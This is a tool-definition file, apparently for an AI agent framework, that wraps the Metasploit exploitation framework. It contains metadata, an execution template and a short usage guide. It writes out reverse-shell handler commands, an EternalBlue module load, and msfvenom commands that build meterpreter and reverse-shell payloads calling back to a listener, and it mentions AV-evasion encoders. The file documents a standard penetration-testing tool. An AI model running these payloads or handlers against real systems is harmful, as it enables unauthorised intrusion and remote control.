---
id: security-exploit-metasploit
namespace: security:exploit:metasploit
name: metasploit
description: Full-featured exploitation framework with thousands of modules for exploit development, payload generation, and post-exploitation.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - exploit.development
  - payload.generation
  - post.exploitation
  - agent.communication
  - vulnerability.scanning
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - searchsploit
  - empire
  - sliver
  - covenant
artifacts:
  - type: exploit.session
    description: Active meterpreter or shell session
    mime: application/octet-stream
    trust_level: verified
  - type: exploit.payload
    description: Generated payload binary
    mime: application/octet-stream
    trust_level: verified
  - type: exploit.loot
    description: Collected loot data
    mime: application/octet-stream
    trust_level: verified
workflow_edges:
  produces:
    - shell-session
    - meterpreter-session
    - payload-binary
    - loot-data
  consumes:
    - target-ip
    - target-port
    - exploit-module
    - payload-type
contract:
  inputs:
    - type: network.target.ip
      description: Target IP address
    - type: network.port.number
      description: Target port number
    - type: exploit.module.name
      description: Metasploit module to use
    - type: payload.type
      description: Payload type (reverse shell, bind shell, etc.)
  outputs:
    - type: session.shell
      description: Interactive shell session
      mime: text/plain
    - type: payload.binary
      description: Generated payload
      mime: application/octet-stream
  side_effects:
    - network_traffic
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: high
    memory_mb: 256
    network: high
    disk_io: low
resource_profile:
  cpu: high
  memory_mb: 256
  network: high
  disk_io: low
allowed-tools:
  - metasploit
  - Bash
  - execFile
features:
  - stealth
  - network-intensive
parameters:
  - name: flag-m
    type: string
    required: false
    description: "Module path to load"
    aliases:
      - -m
      - --module-path
  - name: flag-q
    type: boolean
    required: false
    description: "Quiet mode (suppress banner)"
    aliases:
      - -q
      - --quiet
  - name: flag-r
    type: string
    required: false
    description: "Resource file to execute"
    aliases:
      - -r
      - --resource
  - name: flag-x
    type: string
    required: false
    description: "Command to run"
    aliases:
      - -x
      - --command
  - name: flag-o
    type: string
    required: false
    description: "Output file"
    aliases:
      - -o
      - --output
  - name: flag-L
    type: string
    required: false
    description: "Log file"
    aliases:
      - -L
      - --log
  - name: flag-v
    type: boolean
    required: false
    description: "Verbose output"
    aliases:
      - -v
      - --verbose
  - name: flag-d
    type: string
    required: false
    description: "Database backend to use"
    aliases:
      - -d
      - --database
  - name: flag-c
    type: string
    required: false
    description: "Config file"
    aliases:
      - -c
      - --config
  - name: flag-a
    type: boolean
    required: false
    description: "Analyze module"
    aliases:
      - -a
      - --analyze
  - name: flag-e
    type: string
    required: false
    description: "Environment"
    aliases:
      - -e
      - --environment
  - name: flag-h
    type: boolean
    required: false
    description: "Show help"
    aliases:
      - -h
      - --help
execution:
  template: "msfconsole -q -x \"{command}\""
  sandbox: execFile
  timeout_seconds: 600
  shell: false
global_vars:
  command: "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
examples:
  - description: "Start console with resource script"
    command: msfconsole -q -r /path/to/resource.rc
  - description: "Run single command from CLI"
    command: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
  - description: "Quiet mode with database"
    command: msfconsole -q -d msf
  - description: "Generate payload with msfvenom"
    command: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload.elf
  - description: "List all exploits"
    command: msfconsole -q -x "show exploits"
  - description: "Load a specific module"
    command: msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue"
  - description: "Verbose debug mode"
    command: msfconsole -q -v -x "db_nmap -sV 10.0.0.0/24"
references:
  - label: "Metasploit GitHub"
    url: "https://github.com/rapid7/metasploit-framework"
  - label: "Metasploit Documentation"
    url: "https://docs.metasploit.com/"
phase: exploitation
techniques:
  - execution
  - execution
  - command-and-control
items:
  - NoCreds
  - Hash
services: []
attack_types:
  - Exploitation
---
# Metasploit — Exploitation Framework

Metasploit is the most widely used exploitation framework, providing a comprehensive suite for exploit development, payload generation, and post-exploitation. It includes thousands of modules spanning all phases of penetration testing.

## Key Modules

- **Exploit modules**: Pre-built exploits targeting known vulnerabilities
- **Payload modules**: Shellcode for various architectures and platforms  
- **Auxiliary modules**: Scanners, fuzzers, and recon tools
- **Post modules**: Post-exploitation tasks (privilege escalation, credential dumping)
- **Encoder modules**: Payload encoding for IDS/AV evasion
- **NOP generators**: Generate NOP sleds for exploit development

## Common Commands

| Command | Description |
|---------|-------------|
| `use <module>` | Load a specific module |
| `set <option> <value>` | Set a module option |
| `run` / `exploit` | Execute the loaded module |
| `show options` | Display module configuration |
| `sessions -l` | List active sessions |
| `sessions -i <id>` | Interact with a session |
| `search <term>` | Search across all modules |
| `db_nmap <args>` | Run nmap through metasploit DB |

## Payload Generation with msfvenom

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f py -o shell.py
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 R > payload.apk
```
